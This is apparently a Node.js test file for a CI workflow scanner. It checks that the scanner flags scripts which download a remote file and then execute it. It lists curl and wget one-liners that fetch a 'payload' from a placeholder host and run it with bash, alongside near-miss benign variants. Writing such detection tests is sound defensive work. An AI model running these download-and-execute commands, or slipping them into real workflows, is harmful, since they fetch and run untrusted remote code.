'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const url='https://example.invalid/fixture';
const download='curl -fsSL '+url+' -o payload';
function workflow(script){
 const src=['on: push','permissions: read-all','jobs:','  test:','    runs-on: ubuntu-latest','    steps:','      - run: |',...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(src,{path:'.github/workflows/sentinel-round11.yml'});
}
const bad=[
 'command '+download+'; bash payload',
 'command -p '+download+'; bash payload',
 'env '+download+'; bash payload',
 download+'; bash +x payload',
 download+'; install -m 755 payload copied; bash copied',
 download+'; install --mode=755 payload copied; bash copied',
 'curl -fsSL '+url+' >temp >payload; bash payload',
 'wget -qO- '+url+' >payload; bash payload'
];
const benign=[
 'wget -q '+url+' >payload; bash payload',
 'wget -o payload '+url+'; bash payload',
 'curl -fsSL '+url+' >payload >safe; bash payload',
 'curl -fsSL '+url+' -o safe >payload; bash payload',
 download+'; install -d payload copied; bash copied'
];
for(const [i,s] of bad.entries())test('taint positive '+i,()=>{
 assert.ok(findingsForScript(s).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),s);
 assert.ok(workflow(s).findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),s);
});
for(const [i,s] of benign.entries())test('taint negative '+i,()=>{
 assert.ok(!findingsForScript(s).includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),s);
 assert.ok(!workflow(s).findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),s);
});
